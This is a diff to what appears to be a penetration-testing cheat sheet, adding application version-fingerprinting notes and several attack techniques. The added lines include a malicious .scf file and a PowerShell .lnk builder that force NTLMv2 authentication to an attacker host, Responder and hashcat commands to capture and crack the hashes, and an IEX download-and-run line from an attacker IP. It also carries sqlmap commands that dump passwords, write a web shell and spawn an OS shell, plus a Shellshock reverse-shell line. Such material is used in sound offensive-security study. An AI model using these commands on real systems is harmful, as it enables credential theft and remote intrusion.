@@ -498,14 +498,6 @@ sudo -sU -sS -sCV -oA <NAME>.udp <IP> -v
 | `ncat -nv --source-port 53 10.129.2.28 50000`                                                 | Connect To The Filtered Port                           |
 | `nmap -sL 172.16.7.60`                                                                        | Get hostname of a host                                 |
 
-## Application Specific Footprinting
-
-|**Name**|**Instruction**|
-|-----------------|------------------------------------------------------------------------------------------------------------------------------------------------|
-|Mitel Micollab|`view source of HOST/ucs/micollab/ , Full version within source. >v9.4sp2 vulnerable to Log4j`|
-|OnPrem Exchange|`/EWS/Exchange.asmx full version of server within response header`|
-|Sharepoint Server|`Able to fingerprint version of Sharepoint via either null login attempt (Return header) or /_vti_pvt/service.cnf. `|
-|VMWare Horizon| `/portal/info.jsp may also be /appblast/info.jsp  vmware client version , able to enumate version via download link/documentation E.G 2203 means using 2111 connection server `|
 
 ## AUTORECON
 
@@ -709,6 +701,15 @@ finger "|/bin/ls -a /<IP>"
 nikto -h <URL>
 python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
 ```
+### Application Specific Footprinting
+
+|**Name**|**Instruction**|
+|-----------------|------------------------------------------------------------------------------------------------------------------------------------------------|
+|Mitel Micollab|`view source of HOST/ucs/micollab/ , Full version within source. >v9.4sp2 vulnerable to Log4j`|
+|OnPrem Exchange|`/EWS/Exchange.asmx full version of server within response header`|
+|Sharepoint Server|`Able to fingerprint version of Sharepoint via either null login attempt (Return header) or /_vti_pvt/service.cnf. `|
+|VMWare Horizon| `/portal/info.jsp may also be /appblast/info.jsp  vmware client version , able to enumate version via download link/documentation E.G 2203 means using 2111 connection server `|
+|[Drupal](https://github.com/DeathHacks/droopescan)| Up to date version of Droopescan using rainbow table to determine version.  Scripts to populate table available on github  |
 
 ### Wordpress
 
@@ -3364,6 +3365,33 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
 ```
 
+Use of malicious .ico (icon) file to force NTLMV2 authentication to attacker infra. 
+```
+[Shell]
+Command=2
+IconFile=\\ATTCKERIP\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+| **Command** | **Description** |
+| --- | --- |
+|`sudo responder -wrf -v -I tun0`| Start responder and wait for attempted authentication |
+|`hashcat -m 5600 HASH WORDLIST`| Attempt to crack hash using hashcat|
+
+Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as Lnkbomb, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+
+```
+
 ### Other Commands
 
 | **Command** | **Description** |
@@ -3385,6 +3413,7 @@ Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
 | `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1` | Mount VHD/VHDX on Linux |
 | `sudo python2.7 windows-exploit-suggester.py --update` | Update Windows Exploit Suggester database |
 | `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Running Windows Exploit Suggester |
+| `IEX (iwr 'http://10.10.10.205/procmon.ps1') `| Run Monitor Script hosted on attacker machine using Invoke-Expression and Invoke-WebRequest.  |
 
 ### Useful tools 
 
@@ -4146,31 +4175,31 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 
 | **Command**                                                                                           | **Description**                                     |
 |---------------------------------------------------------------------------------------------------|-------------------------------------------------|
-| sqlmap -h                                                                                         | View the basic help menu                        |
-| sqlmap -hh                                                                                        | View the advanced help menu                     |
-| sqlmap -u "http://www.example.com/vuln.php?id=1" --batch                                          | Run SQLMap without asking for user input        |
-| sqlmap 'http://www.example.com/' --data 'uid=1&name=test'                                         | SQLMap with POST request                        |
-| sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'                                        | POST request specifying an injection point with an asterisk |
-| sqlmap -r req.txt                                                                                 | Passing an HTTP request file to SQLMap          |
-| sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'                                  | Specifying a cookie header                      |
-| sqlmap -u www.target.com --data='id=1' --method PUT                                               | Specifying a PUT request                        |
-| sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt                       | Store traffic to an output file                 |
-| sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch                                      | Specify verbosity level                         |
-| sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"                               | Specifying a prefix or suffix                   |
-| sqlmap -u www.example.com/?id=1 -v 3 --level=5                                                    | Specifying the level and risk                   |
-| sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba            | Basic DB enumeration                            |
-| sqlmap -u "http://www.example.com/?id=1" --tables -D testdb                                       | Table enumeration                               |
-| sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname                | Table/row enumeration                           |
-| sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"       | Conditional enumeration                         |
-| sqlmap -u "http://www.example.com/?id=1" --schema                                                 | Database schema enumeration                     |
-| sqlmap -u "http://www.example.com/?id=1" --search -T user                                         | Searching for data                              |
-| sqlmap -u "http://www.example.com/?id=1" --passwords --batch                                      | Password enumeration and cracking               |
-| sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token" | Anti-CSRF token bypass              |
-| sqlmap --list-tampers                                                                             | List all tamper scripts                         |
-| sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba                                        | Check for DBA privileges                        |
-| sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"                                | Reading a local file                            |
-| sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" | Writing a file                             |
-| sqlmap -u "http://www.example.com/?id=1" --os-shell                                               | Spawning an OS shell                            |
+| `sqlmap -h `                                                                                        | View the basic help menu                        |
+| `sqlmap -hh `                                                                                       | View the advanced help menu                     |
+| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch `                                         | Run SQLMap without asking for user input        |
+| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                         | SQLMap with POST request                        |
+| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'  `                                      | POST request specifying an injection point with an asterisk |
+| `sqlmap -r req.txt   `                                                                              | Passing an HTTP request file to SQLMap          |
+| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'    `                              | Specifying a cookie header                      |
+| `sqlmap -u www.target.com --data='id=1' --method PUT    `                                           | Specifying a PUT request                        |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt   `                    | Store traffic to an output file                 |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                      | Specify verbosity level                         |
+| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"   `                            | Specifying a prefix or suffix                   |
+| `sqlmap -u www.example.com/?id=1 -v 3 --level=5   `                                                 | Specifying the level and risk                   |
+| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba    `        | Basic DB enumeration                            |
+| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb `                                      | Table enumeration                               |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname `               | Table/row enumeration                           |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'" `      | Conditional enumeration                         |
+| `sqlmap -u "http://www.example.com/?id=1" --schema      `                                           | Database schema enumeration                     |
+| `sqlmap -u "http://www.example.com/?id=1" --search -T user  `                                       | Searching for data                              |
+| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch `                                     | Password enumeration and cracking               |
+| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass              |
+| `sqlmap --list-tampers  `                                                                           | List all tamper scripts                         |
+| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba `                                       | Check for DBA privileges                        |
+| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"   `                             | Reading a local file                            |
+| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" `| Writing a file                             |
+| `sqlmap -u "http://www.example.com/?id=1" --os-shell    `                                           | Spawning an OS shell                            |
 
 
 ## Ffuf
